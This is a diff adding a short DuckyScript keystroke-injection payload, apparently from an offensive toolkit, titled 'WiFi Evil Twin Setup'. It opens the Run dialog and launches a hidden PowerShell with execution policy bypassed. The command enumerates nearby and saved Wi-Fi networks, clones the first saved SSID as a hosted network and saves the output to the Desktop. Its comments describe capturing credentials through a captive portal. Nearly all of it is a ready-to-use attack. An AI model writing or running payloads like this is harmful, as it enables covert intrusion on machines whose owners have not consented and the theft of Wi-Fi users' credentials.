@@ -1,0 +1,13 @@
+REM ============================================
+REM  FU PERSON | WiFi Evil Twin Setup
+REM  FLLC - by PERSON FU
+REM  Time: ~12 seconds | Stealth: MEDIUM
+REM  Creates rogue AP matching nearby network
+REM  Captures credentials via captive portal
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$r=@();$r+='=== WIFI EVIL TWIN PREPARATION ===';$r+='Time: '+(Get-Date);$r+='';$r+='=== NEARBY NETWORKS ===';$nets=netsh wlan show networks mode=bssid;$nets|%{$r+=$_};$r+='';$r+='=== SAVED NETWORK PROFILES ===';$profs=netsh wlan show profiles;$profs|%{$r+=$_};$r+='';$r+='=== CREATING HOSTED NETWORK ===';$first=(netsh wlan show profiles|sls 'All User Profile'|select -f 1).ToString().Split(':')[1].Trim();if($first){$r+='Target SSID: '+$first;netsh wlan set hostednetwork mode=allow ssid=$first key='password123' 2>$null|%{$r+=$_};$r+='';$r+='=== ADAPTER INFO ===';netsh wlan show hostednetwork 2>$null|%{$r+=$_};$r+='';$r+='NOTE: Start with: netsh wlan start hostednetwork';$r+='Then configure ICS (Internet Connection Sharing) on main adapter';$r+='Connect DNS to captive portal at 10.0.0.1'}else{$r+='No saved networks found for cloning'};$r+='';$r+='=== DIRECT WIFI INTERFACE INFO ===';Get-NetAdapter|?{$_.Name -match 'Wi-Fi|Wireless'}|%{$r+=$_.Name+' | '+$_.Status+' | '+$_.MacAddress};$r|Out-File ([Environment]::GetFolderPath('Desktop')+'\evil_twin_prep.txt') -Encoding UTF8"
+ENTER
+DELAY 500
